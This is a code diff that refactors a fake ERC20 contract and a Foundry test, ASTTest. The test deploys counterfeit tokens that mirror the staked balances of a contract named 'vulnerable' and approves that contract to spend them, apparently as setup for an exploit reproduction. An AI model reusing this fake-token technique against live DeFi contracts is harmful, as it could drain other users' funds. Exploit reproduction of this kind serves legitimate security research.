@@ -18,24 +18,14 @@ contract MyERC20 {
     mapping(address => mapping(address => uint256)) public allowance;
 
     uint8 public decimals = 18;
-    address public stakedTokenAddr = address(0);
-    uint256 public scaledBalanceToBal = 0;
-    function setStakedTokenAddress(address _stakedTokenAddress)external{
+    address public stakedTokenAddr;
+    uint256 public scaledBalanceToBal;
+    constructor(address _stakedTokenAddress,uint256 bal)public{
         stakedTokenAddr = _stakedTokenAddress;
-    }
-    function setScaledBalanceToBalance(uint256 bal)external{
         scaledBalanceToBal = bal;
     }
-
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
-
-    function transfer(address recipient, uint256 amount) external returns (bool) {
-        balanceOf[msg.sender] -= amount;
-        balanceOf[recipient] += amount;
-        emit Transfer(msg.sender, recipient, amount);
-        return true;
-    }
 
     function approve(address spender, uint256 amount) external returns (bool) {
         allowance[msg.sender][spender] = amount;
@@ -113,9 +103,7 @@ contract ASTTest is Test {
         for(uint8 i = 0; i < stakedTokens.length; i++){
             uint staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
             balances[i] = staked_bal;
-            MyERC20 MyToken = new MyERC20();
-            MyToken.setStakedTokenAddress(stakedTokens[i]);
-            MyToken.setScaledBalanceToBalance(staked_bal);
+            MyERC20 MyToken = new MyERC20(stakedTokens[i],staked_bal);
             MyToken.mint(10_000 * 1e18);
             MyToken.approve(address(vulnerable),type(uint).max);
 
